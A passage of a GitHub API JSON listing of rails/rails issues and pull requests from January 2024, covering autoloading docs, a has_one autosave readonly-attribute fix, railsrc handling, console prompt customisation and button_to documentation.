                "url": "https://api.github.com/repos/rails/rails/labels/docs",
                "name": "docs",
                "color": "02d7e1",
                "default": false,
                "description": null
            }
        ],
        "state": "closed",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 4,
        "created_at": "2024-01-28T17:18:30Z",
        "updated_at": "2024-01-28T18:16:28Z",
        "closed_at": "2024-01-28T18:16:27Z",
        "author_association": "MEMBER",
        "active_lock_reason": null,
        "draft": false,
        "pull_request": {
            "url": "https://api.github.com/repos/rails/rails/pulls/50902",
            "html_url": "https://github.com/rails/rails/pull/50902",
            "diff_url": "https://github.com/rails/rails/pull/50902.diff",
            "patch_url": "https://github.com/rails/rails/pull/50902.patch",
            "merged_at": "2024-01-28T18:16:27Z"
        },
        "body": "I'd suggest to deemphasize `add_autoload_paths_to_load_path` in the docs, by removing its section from the autoloading guide.\r\n\r\nAs [we say](https://github.com/rails/rails/blob/main/guides/source/upgrading_ruby_on_rails.md#autoloaded-paths-are-no-longer-in-load_path) in the upgrading guide for 7.1:\r\n\r\n> we discourage [enabling this], classes and modules in the autoload paths are meant to be autoloaded. That is, just reference them.\r\n\r\nIf we document that you can toggle this in the autoloading guide, we should follow with something like: \"this would make sense for example if...\", and I don't see a use case. The upgrading guide is right. You're not supposed to issue `require` calls for stuff in the autoload paths, therefore there should be no API for that.\r\n\r\nSo, I would just remove these docs. If someone finds this in their code base, the configuration guide documents it.\r\n\r\nI'd also backport this to `7-1-stable`, whose autoloading guide [is incorrect right now](https://github.com/rails/rails/blob/20c58a4ea2e721cea9548cc9bbf720e882b1619d/guides/source/autoloading_and_reloading_constants.md#load_pathload_path) (it says this is `true` by default).\r\n\r\n@byroot what do you think? Could we even perhaps consider this flag to be a transition aid that could be deprecated and later deleted?\r\n\r\n/cc @siaw23 ",
        "reactions": {
            "url": "https://api.github.com/repos/rails/rails/issues/50902/reactions",
            "total_count": 0,
            "+1": 0,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 0,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/rails/rails/issues/50902/timeline",
        "performed_via_github_app": null,
        "state_reason": null
    },
    {
        "url": "https://api.github.com/repos/rails/rails/issues/50901",
        "repository_url": "https://api.github.com/repos/rails/rails",
        "labels_url": "https://api.github.com/repos/rails/rails/issues/50901/labels{/name}",
        "comments_url": "https://api.github.com/repos/rails/rails/issues/50901/comments",
        "events_url": "https://api.github.com/repos/rails/rails/issues/50901/events",
        "html_url": "https://github.com/rails/rails/pull/50901",
        "id": 2104069423,
        "node_id": "PR_kwDNIULOZUBH_g",
        "number": 50901,
        "title": "[Fix #50897] Autosaving `has_one` sets foreign key attribute when unchanged",
        "user": {
            "login": "joshuay03",
            "id": 54629302,
            "node_id": "MDQ6VXNlcjU0NjI5MzAy",
            "avatar_url": "https://avatars.githubusercontent.com/u/54629302?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/joshuay03",
            "html_url": "https://github.com/joshuay03",
            "followers_url": "https://api.github.com/users/joshuay03/followers",
            "following_url": "https://api.github.com/users/joshuay03/following{/other_user}",
            "gists_url": "https://api.github.com/users/joshuay03/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/joshuay03/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/joshuay03/subscriptions",
            "organizations_url": "https://api.github.com/users/joshuay03/orgs",
            "repos_url": "https://api.github.com/users/joshuay03/repos",
            "events_url": "https://api.github.com/users/joshuay03/events{/privacy}",
            "received_events_url": "https://api.github.com/users/joshuay03/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [
            {
                "id": 107191,
                "node_id": "MDU6TGFiZWwxMDcxOTE=",
                "url": "https://api.github.com/repos/rails/rails/labels/activerecord",
                "name": "activerecord",
                "color": "0b02e1",
                "default": false,
                "description": null
            }
        ],
        "state": "closed",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 0,
        "created_at": "2024-01-28T09:30:20Z",
        "updated_at": "2024-02-21T20:38:34Z",
        "closed_at": "2024-02-21T20:21:24Z",
        "author_association": "CONTRIBUTOR",
        "active_lock_reason": null,
        "draft": false,
        "pull_request": {
            "url": "https://api.github.com/repos/rails/rails/pulls/50901",
            "html_url": "https://github.com/rails/rails/pull/50901",
            "diff_url": "https://github.com/rails/rails/pull/50901.diff",
            "patch_url": "https://github.com/rails/rails/pull/50901.patch",
            "merged_at": "2024-02-21T20:21:24Z"
        },
        "body": "<!--\r\nThanks for contributing to Rails!\r\n\r\nPlease do not make *Draft* pull requests, as they still send\r\nnotifications to everyone watching the Rails repo.\r\n\r\nCreate a pull request when it is ready for review and feedback\r\nfrom the Rails team :).\r\n\r\nIf your pull request affects documentation or any non-code\r\nchanges, guidelines for those changes are [available\r\nhere](https://edgeguides.rubyonrails.org/contributing_to_ruby_on_rails.html#contributing-to-the-rails-documentation)\r\n\r\nAbout this template\r\n\r\nThe following template aims to help contributors write a good description for their pull requests.\r\nWe'd like you to provide a description of the changes in your pull request (i.e. bugs fixed or features added), motivation behind the changes, and complete the checklist below before opening a pull request.\r\n\r\nFeel free to discard it if you need to (e.g. when you just fix a typo). -->\r\n\r\n### Motivation / Background\r\n\r\n<!--\r\nDescribe why this Pull Request needs to be merged. What bug have you fixed? What feature have you added? Why is it important?\r\nIf you are fixing a specific issue, include \"Fixes #ISSUE\" (replace with the issue number, remove the quotes) and the issue will be linked to this PR.\r\n-->\r\n\r\nFixes https://github.com/rails/rails/issues/50897\r\n\r\nSimilar to https://github.com/rails/rails/pull/46759\r\n\r\n### Detail\r\n\r\nUpdates `ActiveRecord::AutosaveAssociation#save_has_one_association` to only update the foreign key attribute on the child record if it has changed. This makes its behaviour consistent with `belongs_to` associations and ensures that `ActiveRecord::ReadOnlyAttributeError` isn't raised when no changes have been made to the attribute.\r\n\r\n### Additional information\r\n\r\n<!-- Provide additional information such as benchmarks, reference to other repositories or alternative solutions. -->\r\n\r\nNone.\r\n\r\n### Checklist\r\n\r\nBefore submitting the PR make sure the following are checked:\r\n\r\n* [x] This Pull Request is related to one change. Changes that are unrelated should be opened in separate PRs.\r\n* [x] Commit message has a detailed description of what changed and why. If this PR fixes a related issue include it in the commit message. Ex: `[Fix #issue-number]`\r\n* [x] Tests are added or updated if you fix a bug or add a feature.\r\n* [x] CHANGELOG files are updated for the changed libraries if there is a behavior change or additional feature. Minor bug fixes and documentation changes should not be included.\r\n",
        "reactions": {
            "url": "https://api.github.com/repos/rails/rails/issues/50901/reactions",
            "total_count": 0,
            "+1": 0,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 0,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/rails/rails/issues/50901/timeline",
        "performed_via_github_app": null,
        "state_reason": null
    },
    {
        "url": "https://api.github.com/repos/rails/rails/issues/50900",
        "repository_url": "https://api.github.com/repos/rails/rails",
        "labels_url": "https://api.github.com/repos/rails/rails/issues/50900/labels{/name}",
        "comments_url": "https://api.github.com/repos/rails/rails/issues/50900/comments",
        "events_url": "https://api.github.com/repos/rails/rails/issues/50900/events",
        "html_url": "https://github.com/rails/rails/issues/50900",
        "id": 2103709267,
        "node_id": "I_kwDNIULOfWQOUw",
        "number": 50900,
        "title": "Make it possible to skip CSS when generating APIs, or bring the possibility to skip entire `railsrc` or template files.",
        "user": {
            "login": "ruyrocha",
            "id": 108208,
            "node_id": "MDQ6VXNlcjEwODIwOA==",
            "avatar_url": "https://avatars.githubusercontent.com/u/108208?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/ruyrocha",
            "html_url": "https://github.com/ruyrocha",
            "followers_url": "https://api.github.com/users/ruyrocha/followers",
            "following_url": "https://api.github.com/users/ruyrocha/following{/other_user}",
            "gists_url": "https://api.github.com/users/ruyrocha/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/ruyrocha/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/ruyrocha/subscriptions",
            "organizations_url": "https://api.github.com/users/ruyrocha/orgs",
            "repos_url": "https://api.github.com/users/ruyrocha/repos",
            "events_url": "https://api.github.com/users/ruyrocha/events{/privacy}",
            "received_events_url": "https://api.github.com/users/ruyrocha/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [
            {
                "id": 107195,
                "node_id": "MDU6TGFiZWwxMDcxOTU=",
                "url": "https://api.github.com/repos/rails/rails/labels/railties",
                "name": "railties",
                "color": "8BE06E",
                "default": false,
                "description": null
            }
        ],
        "state": "closed",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 1,
        "created_at": "2024-01-27T18:19:52Z",
        "updated_at": "2024-01-29T17:43:30Z",
        "closed_at": "2024-01-29T17:42:06Z",
        "author_association": "CONTRIBUTOR",
        "active_lock_reason": null,
        "body": "### Steps to reproduce\r\n\r\nHere is the relevant `railsrc` file:\r\n\r\n```ruby\r\n--database=trilogy\r\n--css=tailwind\r\n--skip-jbuilder\r\n\r\n--template=~/Development/Rails/template.rb\r\n```\r\n\r\nAnd this is the outcome when trying to create an API only app using file:\r\n\r\n<!-- (Guidelines for creating a bug report are [available\r\nhere](https://edgeguides.rubyonrails.org/contributing_to_ruby_on_rails.html#creating-a-bug-report)) -->\r\n\r\n<!-- Paste your executable test case created from one of the scripts found [here](https://edgeguides.rubyonrails.org/contributing_to_ruby_on_rails.html#create-an-executable-test-case) below: -->\r\n```shell\r\nruy@devastator ~/D/Rails> rails new --api chaotic-api\r\nUsing --database=trilogy --css=tailwind --skip-jbuilder --template=~/Development/Rails/template.rb from /home/ruy/.railsrc\r\nBased on the specified options, the following options will also be activated:\r\n\r\n  --skip-javascript [due to --api]\r\n  --skip-hotwire [due to --skip-javascript]\r\n  --skip-asset-pipeline [due to --api]\r\n...\r\nFetching gem metadata from https://rubygems.org/..........\r\nResolving dependencies...\r\nBundle complete! 19 Gemfile dependencies, 100 gems now installed.\r\nUse `bundle info [gemname]` to see where a bundled gem is installed.\r\n         run  bundle lock --add-platform=x86_64-linux\r\nWriting lockfile to /home/ruy/Development/Rails/chaotic-api/Gemfile.lock\r\n         run  bundle binstubs bundler\r\n       rails  tailwindcss:install\r\nbin/rails aborted!\r\nDon't know how to build task 'assets:precompile' (See the list of available tasks with `bin/rails --tasks`)\r\n/home/ruy/Development/Rails/chaotic-api/Rakefile:6:in `<main>'\r\n```\r\n\r\n### Expected behavior\r\n\r\n1. Skip CSS when generating APIs only.\r\n2. Make it possible to skip entire `railsrc` file.\r\n3. Make it possible to skip template files on the command line.\r\n\r\n<!-- Tell us what should happen -->\r\n\r\n### Actual behavior\r\nCannot generate API only apps.\r\n\r\n### System configuration\r\n**Rails version**: 7.1.3\r\n\r\n**Ruby version**: 3.2.3\r\n",
        "reactions": {
            "url": "https://api.github.com/repos/rails/rails/issues/50900/reactions",
            "total_count": 0,
            "+1": 0,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 0,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/rails/rails/issues/50900/timeline",
        "performed_via_github_app": null,
        "state_reason": "completed"
    },
    {
        "url": "https://api.github.com/repos/rails/rails/issues/50899",
        "repository_url": "https://api.github.com/repos/rails/rails",
        "labels_url": "https://api.github.com/repos/rails/rails/issues/50899/labels{/name}",
        "comments_url": "https://api.github.com/repos/rails/rails/issues/50899/comments",
        "events_url": "https://api.github.com/repos/rails/rails/issues/50899/events",
        "html_url": "https://github.com/rails/rails/issues/50899",
        "id": 2103705454,
        "node_id": "I_kwDNIULOfWP_bg",
        "number": 50899,
        "title": "Allow comments on `railsrc`.",
        "user": {
            "login": "ruyrocha",
            "id": 108208,
            "node_id": "MDQ6VXNlcjEwODIwOA==",
            "avatar_url": "https://avatars.githubusercontent.com/u/108208?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/ruyrocha",
            "html_url": "https://github.com/ruyrocha",
            "followers_url": "https://api.github.com/users/ruyrocha/followers",
            "following_url": "https://api.github.com/users/ruyrocha/following{/other_user}",
            "gists_url": "https://api.github.com/users/ruyrocha/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/ruyrocha/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/ruyrocha/subscriptions",
            "organizations_url": "https://api.github.com/users/ruyrocha/orgs",
            "repos_url": "https://api.github.com/users/ruyrocha/repos",
            "events_url": "https://api.github.com/users/ruyrocha/events{/privacy}",
            "received_events_url": "https://api.github.com/users/ruyrocha/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [],
        "state": "closed",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 2,
        "created_at": "2024-01-27T18:10:54Z",
        "updated_at": "2024-01-29T20:37:22Z",
        "closed_at": "2024-01-29T17:44:02Z",
        "author_association": "CONTRIBUTOR",
        "active_lock_reason": null,
        "body": "### Steps to reproduce\r\n<!-- (Guidelines for creating a bug report are [available\r\nhere](https://edgeguides.rubyonrails.org/contributing_to_ruby_on_rails.html#creating-a-bug-report)) -->\r\n\r\n<!-- Paste your executable test case created from one of the scripts found [here](https://edgeguides.rubyonrails.org/contributing_to_ruby_on_rails.html#create-an-executable-test-case) below: -->\r\nAllow comments on `railsrc` file, as right now they're treated as arguments:\r\n```ruby\r\nruy@devastator ~/D/Rails> rails new --api chaotic-api\r\nUsing --database=trilogy --css=tailwind --skip-jbuilder #--template=~/Development/Rails/template.rb from /home/ruy/.railsrc\r\nBased on the specified options, the following options will also be activated:\r\n\r\n  --skip-javascript [due to --api]\r\n  --skip-hotwire [due to --skip-javascript]\r\n  --skip-asset-pipeline [due to --api]\r\n```\r\n\r\n### Expected behavior\r\nCommented out lines are not treated as arguments.\r\n\r\n<!-- Tell us what should happen -->\r\n\r\n### Actual behavior\r\nComments behave like command line arguments.\r\n<!-- Tell us what happens instead -->\r\n\r\n### System configuration\r\n**Rails version**: 7.1.3\r\n\r\n**Ruby version**: 3.2.3\r\n",
        "reactions": {
            "url": "https://api.github.com/repos/rails/rails/issues/50899/reactions",
            "total_count": 0,
            "+1": 0,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 0,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/rails/rails/issues/50899/timeline",
        "performed_via_github_app": null,
        "state_reason": "completed"
    },
    {
        "url": "https://api.github.com/repos/rails/rails/issues/50898",
        "repository_url": "https://api.github.com/repos/rails/rails",
        "labels_url": "https://api.github.com/repos/rails/rails/issues/50898/labels{/name}",
        "comments_url": "https://api.github.com/repos/rails/rails/issues/50898/comments",
        "events_url": "https://api.github.com/repos/rails/rails/issues/50898/events",
        "html_url": "https://github.com/rails/rails/pull/50898",
        "id": 2103642252,
        "node_id": "PR_kwDNIULOZTrF4g",
        "number": 50898,
        "title": "Allow customization to console prompt's format",
        "user": {
            "login": "nathansamson",
            "id": 93735,
            "node_id": "MDQ6VXNlcjkzNzM1",
            "avatar_url": "https://avatars.githubusercontent.com/u/93735?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/nathansamson",
            "html_url": "https://github.com/nathansamson",
            "followers_url": "https://api.github.com/users/nathansamson/followers",
            "following_url": "https://api.github.com/users/nathansamson/following{/other_user}",
            "gists_url": "https://api.github.com/users/nathansamson/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/nathansamson/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/nathansamson/subscriptions",
            "organizations_url": "https://api.github.com/users/nathansamson/orgs",
            "repos_url": "https://api.github.com/users/nathansamson/repos",
            "events_url": "https://api.github.com/users/nathansamson/events{/privacy}",
            "received_events_url": "https://api.github.com/users/nathansamson/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [
            {
                "id": 107195,
                "node_id": "MDU6TGFiZWwxMDcxOTU=",
                "url": "https://api.github.com/repos/rails/rails/labels/railties",
                "name": "railties",
                "color": "8BE06E",
                "default": false,
                "description": null
            }
        ],
        "state": "closed",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 8,
        "created_at": "2024-01-27T15:49:48Z",
        "updated_at": "2024-01-29T17:22:50Z",
        "closed_at": "2024-01-28T14:11:49Z",
        "author_association": "NONE",
        "active_lock_reason": null,
        "draft": false,
        "pull_request": {
            "url": "https://api.github.com/repos/rails/rails/pulls/50898",
            "html_url": "https://github.com/rails/rails/pull/50898",
            "diff_url": "https://github.com/rails/rails/pull/50898.diff",
            "patch_url": "https://github.com/rails/rails/pull/50898.patch",
            "merged_at": null
        },
        "body": "Allows more customization of the new console prompts instead of only looking at the `Rails.env` with newly introduced environment variables.\r\n\r\n`RAILS_PROMPT_PREFIX` will replace the dev/test/prod wording regardless the env. This can be useful in case of multiple production environments or staging environments that also use the `production` rails env.\r\n\r\n`RAILS_PROMPT_COLOR` can be used to override the colour. This can be usefully to differentiate between a real production environment and a staging / QA environment that runs in `production` mode.\r\n\r\n### Motivation / Background\r\n\r\n<!--\r\nDescribe why this Pull Request needs to be merged. What bug have you fixed? What feature have you added? Why is it important?\r\nIf you are fixing a specific issue, include \"Fixes #ISSUE\" (replace with the issue number, remove the quotes) and the issue will be linked to this PR.\r\n-->\r\n\r\nThis Pull Request has been created because we often work with different \"production\" like environments.\r\neg they all use the same settings in `production`; but are for different cases. Eg one could be a staging environment, or even multiple production environments eg different installations for different tenants.\r\nIn this case we still want to color the environment (eg red for all actual production environments, but cyan for staging environments) + correctly name them.\r\n\r\n### Detail\r\n\r\nThis Pull Request changes https://github.com/rails/rails/pull/50796\r\n\r\n### Additional information\r\n\r\nI took the liberty to change the last ChangeLog entry (and add my name) instead of creating a new changelog entry, as the changes relate to the latest change anyway.\r\n\r\n### Checklist\r\n\r\nBefore submitting the PR make sure the following are checked:\r\n\r\n* [x] This Pull Request is related to one change. Changes that are unrelated should be opened in separate PRs.\r\n* [x] Commit message has a detailed description of what changed and why. If this PR fixes a related issue include it in the commit message. Ex: `[Fix #issue-number]`\r\n* [x] Tests are added or updated if you fix a bug or add a feature.\r\n* [x] CHANGELOG files are updated for the changed libraries if there is a behavior change or additional feature. Minor bug fixes and documentation changes should not be included.\r\n",
        "reactions": {
            "url": "https://api.github.com/repos/rails/rails/issues/50898/reactions",
            "total_count": 0,
            "+1": 0,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 0,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/rails/rails/issues/50898/timeline",
        "performed_via_github_app": null,
        "state_reason": null
    },
    {
        "url": "https://api.github.com/repos/rails/rails/issues/50897",
        "repository_url": "https://api.github.com/repos/rails/rails",
        "labels_url": "https://api.github.com/repos/rails/rails/issues/50897/labels{/name}",
        "comments_url": "https://api.github.com/repos/rails/rails/issues/50897/comments",
        "events_url": "https://api.github.com/repos/rails/rails/issues/50897/events",
        "html_url": "https://github.com/rails/rails/issues/50897",
        "id": 2103568249,
        "node_id": "I_kwDNIULOfWHneQ",
        "number": 50897,
        "title": "Incorrectly raising `ReadonlyAttributeError` when autosaving `has_one` association with readonly foreign key",
        "user": {
            "login": "Earlopain",
            "id": 14981592,
            "node_id": "MDQ6VXNlcjE0OTgxNTky",
            "avatar_url": "https://avatars.githubusercontent.com/u/14981592?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/Earlopain",
            "html_url": "https://github.com/Earlopain",
            "followers_url": "https://api.github.com/users/Earlopain/followers",
            "following_url": "https://api.github.com/users/Earlopain/following{/other_user}",
            "gists_url": "https://api.github.com/users/Earlopain/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/Earlopain/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/Earlopain/subscriptions",
            "organizations_url": "https://api.github.com/users/Earlopain/orgs",
            "repos_url": "https://api.github.com/users/Earlopain/repos",
            "events_url": "https://api.github.com/users/Earlopain/events{/privacy}",
            "received_events_url": "https://api.github.com/users/Earlopain/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [
            {
                "id": 107191,
                "node_id": "MDU6TGFiZWwxMDcxOTE=",
                "url": "https://api.github.com/repos/rails/rails/labels/activerecord",
                "name": "activerecord",
                "color": "0b02e1",
                "default": false,
                "description": null
            },
            {
                "id": 41328116,
                "node_id": "MDU6TGFiZWw0MTMyODExNg==",
                "url": "https://api.github.com/repos/rails/rails/labels/attached%20PR",
                "name": "attached PR",
                "color": "006b75",
                "default": false,
                "description": null
            }
        ],
        "state": "closed",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": {
            "url": "https://api.github.com/repos/rails/rails/milestones/88",
            "html_url": "https://github.com/rails/rails/milestone/88",
            "labels_url": "https://api.github.com/repos/rails/rails/milestones/88/labels",
            "id": 10422595,
            "node_id": "MI_kwDNIULOAJ8JQw",
            "number": 88,
            "title": "7.1.4",
            "description": null,
            "creator": {
                "login": "rafaelfranca",
                "id": 47848,
                "node_id": "MDQ6VXNlcjQ3ODQ4",
                "avatar_url": "https://avatars.githubusercontent.com/u/47848?v=4",
                "gravatar_id": "",
                "url": "https://api.github.com/users/rafaelfranca",
                "html_url": "https://github.com/rafaelfranca",
                "followers_url": "https://api.github.com/users/rafaelfranca/followers",
                "following_url": "https://api.github.com/users/rafaelfranca/following{/other_user}",
                "gists_url": "https://api.github.com/users/rafaelfranca/gists{/gist_id}",
                "starred_url": "https://api.github.com/users/rafaelfranca/starred{/owner}{/repo}",
                "subscriptions_url": "https://api.github.com/users/rafaelfranca/subscriptions",
                "organizations_url": "https://api.github.com/users/rafaelfranca/orgs",
                "repos_url": "https://api.github.com/users/rafaelfranca/repos",
                "events_url": "https://api.github.com/users/rafaelfranca/events{/privacy}",
                "received_events_url": "https://api.github.com/users/rafaelfranca/received_events",
                "type": "User",
                "site_admin": false
            },
            "open_issues": 9,
            "closed_issues": 5,
            "state": "open",
            "created_at": "2024-01-15T23:00:48Z",
            "updated_at": "2024-02-27T02:00:26Z",
            "due_on": null,
            "closed_at": null
        },
        "comments": 4,
        "created_at": "2024-01-27T12:29:15Z",
        "updated_at": "2024-02-21T20:21:25Z",
        "closed_at": "2024-02-21T20:21:25Z",
        "author_association": "CONTRIBUTOR",
        "active_lock_reason": null,
        "body": "Rails 7.1 sets `raise_on_assign_to_attr_readonly` to true. In the following repro I set a column unrelated to `attr_readonly` yet the error is still being set. If I stop setting this column the error goes away.\r\n\r\n### Steps to reproduce\r\n```ruby\r\n# frozen_string_literal: true\r\n\r\nrequire \"bundler/inline\"\r\n\r\ngemfile(true) do\r\n  source \"https://rubygems.org\"\r\n\r\n  git_source(:github) { |repo| \"https://github.com/#{repo}.git\" }\r\n\r\n  gem \"rails\", github: \"rails/rails\", branch: \"main\"\r\n\r\n  gem \"sqlite3\"\r\nend\r\n\r\nrequire \"active_record\"\r\nrequire \"minitest/autorun\"\r\nrequire \"logger\"\r\n\r\n# This connection will do for database-independent bug reports.\r\nActiveRecord::Base.establish_connection(adapter: \"sqlite3\", database: \":memory:\")\r\nActiveRecord::Base.logger = Logger.new(STDOUT)\r\n\r\nActiveRecord.raise_on_assign_to_attr_readonly = true\r\n\r\nActiveRecord::Schema.define do\r\n  create_table :forum_topics, force: true do |t|\r\n    t.integer :updater_id\r\n    t.text :title\r\n  end\r\n\r\n  create_table :forum_posts, force: true do |t|\r\n    t.integer :updater_id\r\n    t.integer :forum_topic_id\r\n    t.text :body\r\n  end\r\nend\r\n\r\nclass ForumTopic < ActiveRecord::Base\r\n  has_one :original_forum_post, -> { order(\"forum_posts.id asc\") }, class_name: \"ForumPost\", inverse_of: :forum_topic\r\n  validates_associated :original_forum_post\r\n  accepts_nested_attributes_for :original_forum_post\r\nend\r\n\r\nclass ForumPost < ActiveRecord::Base\r\n  attr_readonly :forum_topic_id\r\n  belongs_to :forum_topic\r\n\r\n  before_validation do |rec|\r\n    # next # Skipping setting this column makes the error go away\r\n    if persisted?\r\n      rec.updater_id = 456\r\n    else\r\n      rec.updater_id = 123\r\n    end\r\n  end\r\nend\r\n\r\nclass BugTest < Minitest::Test\r\n  def test_readonly_attr_exception\r\n    topic = ForumTopic.create!(title: \"Hi!\", original_forum_post_attributes: { body: \"What's up?\" })\r\n    topic.update(title: \"nevermind\") # => ActiveRecord::ReadonlyAttributeError: forum_topic_id\r\n    assert_equal(456, topic.original_forum_post.updater_id)\r\n  end\r\nend\r\n```\r\n\r\n### System configuration\r\n**Rails version**: master\r\n\r\n**Ruby version**: 3.2.2",
        "reactions": {
            "url": "https://api.github.com/repos/rails/rails/issues/50897/reactions",
            "total_count": 0,
            "+1": 0,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 0,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/rails/rails/issues/50897/timeline",
        "performed_via_github_app": null,
        "state_reason": "completed"
    },
    {
        "url": "https://api.github.com/repos/rails/rails/issues/50896",
        "repository_url": "https://api.github.com/repos/rails/rails",
        "labels_url": "https://api.github.com/repos/rails/rails/issues/50896/labels{/name}",
        "comments_url": "https://api.github.com/repos/rails/rails/issues/50896/comments",
        "events_url": "https://api.github.com/repos/rails/rails/issues/50896/events",
        "html_url": "https://github.com/rails/rails/pull/50896",
        "id": 2103342136,
        "node_id": "PR_kwDNIULOZTc0Qw",
        "number": 50896,
        "title": "Improve ActionView::Helpers::UrlHelper button_to explanation [ci-skip]",
        "user": {
            "login": "yin0110",
            "id": 95560433,
            "node_id": "U_kgDOBbIi8Q",
            "avatar_url": "https://avatars.githubusercontent.com/u/95560433?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/yin0110",
            "html_url": "https://github.com/yin0110",
            "followers_url": "https://api.github.com/users/yin0110/followers",
            "following_url": "https://api.github.com/users/yin0110/following{/other_user}",
            "gists_url": "https://api.github.com/users/yin0110/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/yin0110/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/yin0110/subscriptions",
            "organizations_url": "https://api.github.com/users/yin0110/orgs",
            "repos_url": "https://api.github.com/users/yin0110/repos",
            "events_url": "https://api.github.com/users/yin0110/events{/privacy}",
            "received_events_url": "https://api.github.com/users/yin0110/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [
            {
                "id": 3666649,
                "node_id": "MDU6TGFiZWwzNjY2NjQ5",
                "url": "https://api.github.com/repos/rails/rails/labels/actionview",
                "name": "actionview",
                "color": "d7e102",
                "default": false,
                "description": null
            }
        ],
        "state": "closed",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 0,
        "created_at": "2024-01-27T07:05:38Z",
        "updated_at": "2024-01-28T14:50:11Z",
        "closed_at": "2024-01-28T14:50:10Z",
        "author_association": "CONTRIBUTOR",
        "active_lock_reason": null,
        "draft": false,
        "pull_request": {
            "url": "https://api.github.com/repos/rails/rails/pulls/50896",
            "html_url": "https://github.com/rails/rails/pull/50896",
            "diff_url": "https://github.com/rails/rails/pull/50896.diff",
            "patch_url": "https://github.com/rails/rails/pull/50896.patch",
            "merged_at": "2024-01-28T14:50:10Z"
        },
        "body": "### Motivation / Background\r\n\r\nThis Pull Request has been created because the current button_to method documentation in Rails API lacks clarity regarding its default HTTP request behavior based on the object's persistence. This update aims to explicitly differentiate between POST and PATCH requests in the method's documentation, providing clearer guidance for developers, especially when handling objects with different persistence states.\r\n\r\n\r\n### Checklist\r\n\r\nBefore submitting the PR make sure the following are checked:\r\n\r\n* [x] This Pull Request is related to one change. Changes that are unrelated should be opened in separate PRs.\r\n* [x] Commit message has a detailed description of what changed and why. If this PR fixes a related issue include it in the commit message. Ex: `[Fix #issue-number]`\r\n* [x] Tests are added or updated if you fix a bug or add a feature.\r\n* [x] CHANGELOG files are updated for the changed libraries if there is a behavior change or additional feature. Minor bug fixes and documentation changes should not be included.\r\n",
        "reactions": {
            "url": "https://api.github.com/repos/rails/rails/issues/50896/reactions",
            "total_count": 0,
            "+1": 0,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 0,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/rails/rails/issues/50896/timeline",
        "performed_via_github_app": null,
        "state_reason": null
    },
    {
        "url": "https://api.github.com/repos/rails/rails/issues/50895",
        "repository_url": "https://api.github.com/repos/rails/rails",
        "labels_url": "https://api.github.com/repos/rails/rails/issues/50895/labels{/name}",
        "comments_url": "https://api.github.com/repos/rails/rails/issues/50895/comments",
        "events_url": "https://api.github.com/repos/rails/rails/issues/50895/events",
        "html_url": "https://github.com/rails/rails/pull/50895",
        "id": 2103219381,
        "node_id": "PR_kwDNIULOZTZN2g",
        "number": 50895,
        "title": "Enhanced ActiveStorage variant tracking control",
        "user": {
            "login": "JaceBayless",
            "id": 25781337,
            "node_id": "MDQ6VXNlcjI1NzgxMzM3",
            "avatar_url": "https://avatars.githubusercontent.com/u/25781337?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/JaceBayless",
            "html_url": "https://github.com/JaceBayless",
            "followers_url": "https://api.github.com/users/JaceBayless/followers",
            "following_url": "https://api.github.com/users/JaceBayless/following{/other_user}",
            "gists_url": "https://api.github.com/users/JaceBayless/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/JaceBayless/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/JaceBayless/subscriptions",
            "organizations_url": "https://api.github.com/users/JaceBayless/orgs",
            "repos_url": "https://api.github.com/users/JaceBayless/repos",
            "events_url": "https://api.github.com/users/JaceBayless/events{/privacy}",
